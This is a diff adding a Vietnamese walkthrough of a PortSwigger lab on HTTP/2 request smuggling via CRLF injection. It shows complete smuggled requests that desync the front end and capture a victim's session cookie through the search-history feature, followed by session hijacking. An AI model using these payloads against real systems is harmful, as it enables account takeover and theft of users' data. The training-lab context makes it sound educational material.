@@ -474,7 +474,52 @@ Thử submit hai lần, ta thấy response thứ hai có header `Location: https
 Submit request sao cho đúng vào thời điểm sau khi browser của victim load website, và chuẩn bị load javascript resources. Kết quả, bài lab được giải thành công.
 
 # 13. HTTP/2 request smuggling via CRLF injection
+Sử dụng BurpRepeater và Inspector, cấu hình request sau:
+```
+POST / HTTP/2
+Host: 0abf007403377d94c0de3bb500450013.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked
 
+0
+
+GET /404 HTTP/1.1
+Host: 0abf007403377d94c0de3bb500450013.web-security-academy.net
+Content-Length: 10
+Content-Type: application/x-www-form-urlencoded
+
+x=1
+```
+Sau khi submit request hai lần, response trả về `HTTP/2 404 Not Found`. Như vậy website có lỗ hổng H2.TE. Nhận thấy trong website có chức năng tìm kiếm, và hiển thị lịch sử tìm kiếm. Request cho chức năng search như sau:
+```
+POST / HTTP/2
+Host: 0abf007403377d94c0de3bb500450013.web-security-academy.net
+Cookie: session=LX6T5Olh6WCNd4gUkWU3OVUAGfxBW3Zr;
+Content-Length: 14
+Content-Type: application/x-www-form-urlencoded
+
+search=hello
+```
+Như vậy, ta có thể lợi dụng chức năng này để đọc HTTP request của user khác. Cấu hình request bên dưới:
+```
+POST / HTTP/2
+Host: 0abf007403377d94c0de3bb500450013.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Host: 0abf007403377d94c0de3bb500450013.web-security-academy.net
+Cookie: session=LX6T5Olh6WCNd4gUkWU3OVUAGfxBW3Zr
+Content-Length: 100
+Content-Type: application/x-www-form-urlencoded
+
+search=
+```
+Sau khi submit, đợi 15s để user gửi request rồi refresh trang lịch sử tìm kiếm, ta thu được response có chứa một phần HTTP request của user. Thực hiện điều chỉnh Content-Length từ 100 thành các giá trị lớn hơn sao cho lấy được session cookie của victim (cuối cùng, `Content-Length: 1000` là hợp lý). Ta được kết quả bên dưới:
+
+![image](https://user-images.githubusercontent.com/103978452/226163977-50271311-4413-432e-9b8f-8093eca51719.png)
+
+Thay thế session cookie của mình thành session cookie thu được, kết quả bài lab được giải thành công.
 # 14. HTTP/2 request splitting via CRLF injection
 
 # 15. CL.0 request smuggling
